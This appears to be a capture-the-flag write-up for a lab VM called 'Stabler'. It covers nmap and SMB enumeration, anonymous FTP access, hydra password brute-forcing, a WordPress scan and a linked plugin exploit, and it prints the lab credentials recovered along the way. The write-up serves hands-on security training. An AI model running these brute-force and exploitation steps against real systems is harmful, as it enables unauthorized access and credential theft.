# Stabler 

## arp scan

```
sudo arp-scan --localnet
```

<img width="912" height="297" alt="image" src="https://github.com/user-attachments/assets/ad4f0dba-f3fb-4af2-9ffe-8851109494c4" />

## Nmap Scan

```
nmap -sCV -Pn -p- 192.168.92.149
```

```ruby
NSE Timing: About 99.91% done; ETC: 15:24 (0:00:00 remaining)
Nmap scan report for 192.168.92.149
Host is up (0.00055s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.92.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   pkzip-file  .ZIP file
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 8
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, InteractiveClient, SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, Speaks41ProtocolOld, IgnoreSigpipes, DontAllowDatabaseTableColumn, ODBCClient, SupportsCompression, FoundRows, LongPassword, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: ?\x7Fo\x7FM 9\x1B)E94c:k:\x1Cz\x17(
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.95%I=7%D=2/17%Time=6994CE6E%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x1
SF:52\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x0
SF:4\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa
SF:2\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\
SF:x0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\x
SF:b2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu
SF:\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd
SF:3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa
SF:0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x
SF:87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\x
SF:f4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\x
SF:dc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd
SF:5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xa
SF:f\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:
SF:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\
SF:x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\
SF:xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd
SF:\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\
SF:x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\
SF:xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\
SF:xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak
SF:\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\
SF:xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f
SF:\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\
SF:[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\x
SF:cc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa
SF:7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\
SF:xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x9
SF:6\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f
SF:\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4
SF:\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\
SF:x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xb
SF:cL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0
SF:\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\
SF:xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\x
SF:f3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\
SF:?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 00:0C:29:81:26:96 (VMware)
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2026-02-17T22:23:59+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h59m33s, deviation: 0s, median: 1h59m32s
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-02-17T22:23:59
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.15 seconds
                                                                          
```

```ruby
20/tcp    closed ftp-data           ❌
21/tcp    open   ftp         vsftpd 2.0.8 or later
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp    open   domain      dnsmasq 2.75
80/tcp    open   http        PHP cli server 5.5 or later
123/tcp   closed ntp                ❌
137/tcp   closed netbios-ns         ❌
138/tcp   closed netbios-dgm        ❌
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   pkzip-file  .ZIP file
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
```

----
----

## Ftp Anonymous

```
ftp 192.168.92.149
```

<img width="1088" height="342" alt="image" src="https://github.com/user-attachments/assets/250e3b4b-de26-49ef-85b2-fd99f0a0cf62" />

> ## found file called **`note`** let's get it in our machine

```
get note
```

<img width="727" height="165" alt="image" src="https://github.com/user-attachments/assets/68aa63b4-8128-4084-a94a-68011882ee7c" />

<img width="977" height="139" alt="image" src="https://github.com/user-attachments/assets/06158259-66a7-4408-a063-1297e209a060" />

```
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

## till now we have 3 possible usernames :

- harry
- elly
- john

## brute force elly ftp passowrd

```
hydra -l elly -P /home/kali/Downloads/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt ftp://192.168.92.149 
```

```
elly : ylle
```

## found file passwd  

<img width="936" height="173" alt="image" src="https://github.com/user-attachments/assets/45cb68de-a01c-41ca-abd3-ce4a06c017e1" />

## same user and pass for ssh  

<img width="637" height="239" alt="image" src="https://github.com/user-attachments/assets/b551c767-02c7-4a11-9334-96952013c46c" />

---

## Smb 

### since we found smb opend

```
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
```

### let's enumrate some info about it 

```
enum4linux 192.168.92.149
```

### we found the version

<img width="998" height="241" alt="image" src="https://github.com/user-attachments/assets/8fa3c511-f953-422c-b339-7cfe0eeeabf8" />

### found aslo sharenames and comment on kathy share

<img width="1026" height="562" alt="image" src="https://github.com/user-attachments/assets/dc751bf0-2245-47b8-882d-67873ba4af5c" />

```ruby
//192.168.92.149/kathy  Mapping: OK Listing: OK Writing: N/A
//192.168.92.149/tmp    Mapping: OK Listing: OK Writing: N/A
```

<img width="1013" height="185" alt="image" src="https://github.com/user-attachments/assets/9b53ec17-a4d5-425d-bdf3-3ed6b901d576" />

### weak password policy 

<img width="1177" height="490" alt="image" src="https://github.com/user-attachments/assets/2962fd6b-1a7a-414b-8824-8c3ea758ebac" />

### found alot of users 

<img width="802" height="652" alt="image" src="https://github.com/user-attachments/assets/448bca7d-a52f-45ce-b1e2-a7d56f2e2bfe" />

## **`let's get into kathy share`**

```
smbclient //192.168.92.149/kathy -N
```

#### found two directories called **`backup`** and **`kathy_staff`**

<img width="1061" height="654" alt="image" src="https://github.com/user-attachments/assets/d616f49e-6462-4763-b327-fce45c8e588d" />

#### in katty _staff we found another file let's get this files

```
get todo-list.txt
```

#### in backup directory we found another two files 

<img width="1038" height="225" alt="image" src="https://github.com/user-attachments/assets/4d95da79-077d-4eaf-b615-469c86e6116a" />

```
get vsftpd.conf
get wordpress-4.tar.gz
```

## in share **`/tmp`** found another file called `ls`

<img width="980" height="400" alt="image" src="https://github.com/user-attachments/assets/53a82d04-8adb-42bc-9cb0-1bb2c28c4eaa" />

## on port **`666`** found image

```
nc 192.168.92.149 666 > msg
```

<img width="836" height="108" alt="image" src="https://github.com/user-attachments/assets/202290a8-834d-405c-95b8-e02a1973a0a0" />

```
unzip msg
```

<img width="439" height="161" alt="image" src="https://github.com/user-attachments/assets/b8ffdceb-61de-4c90-8349-b964661244f0" />

```
exiftool message2.jpg
```

<img width="945" height="572" alt="image" src="https://github.com/user-attachments/assets/025f5e44-5c35-4eb8-b867-d6bbbd968319" />

## ON PORT **`12380`** found web page but can't find anything 
- when go to **`/robots.txt`** it return same page i change http to **`https`** and found this

<img width="882" height="118" alt="image" src="https://github.com/user-attachments/assets/bb4f21c4-2e44-469a-a2b7-66e339a6b412" />

## **`robots.txt`**

```
User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/
```

<img width="758" height="161" alt="image" src="https://github.com/user-attachments/assets/92f080d3-0bf6-42c1-b10d-e123242a23db" />

## on **`/blogblog`** found wordpress website

```
https://192.168.92.149:12380/blogblog/
```

<img width="1919" height="708" alt="image" src="https://github.com/user-attachments/assets/5b686774-cf0f-4e78-a034-e8d5663f140d" />

## Wp-scan

```
wpscan --url https://192.168.92.149:12380/blogblog/ --plugins-detection aggressive --disable-tls-checks
```

<img width="1320" height="434" alt="image" src="https://github.com/user-attachments/assets/8c90f08c-912d-4ebd-86e6-e9014fc91219" />

## found plugin called **`advanced video`**

> ### i search on it to find exploit to it and i found this 

<img width="1256" height="154" alt="image" src="https://github.com/user-attachments/assets/9fe5a885-c140-4980-9ef8-685a0234ed64" />

### [exploit_code](https://github.com/gtech/39646/blob/master/39646.py)

<img width="1331" height="437" alt="image" src="https://github.com/user-attachments/assets/058324f1-fed1-442d-96fe-242c523e9e84" />

> ## boom found password of **`root`** of mysql database

```
root : plbkac
```

```
mysql -u root -p plbkac -h 192.168.92.149 --skip-ssl
```

<img width="1043" height="451" alt="image" src="https://github.com/user-attachments/assets/4732722a-1108-4c00-8acb-9c20af7cabb6" />

```
hydra -L users -e nsr ssh://192.168.15.151
```

```
SHayslett : SHayslett
```

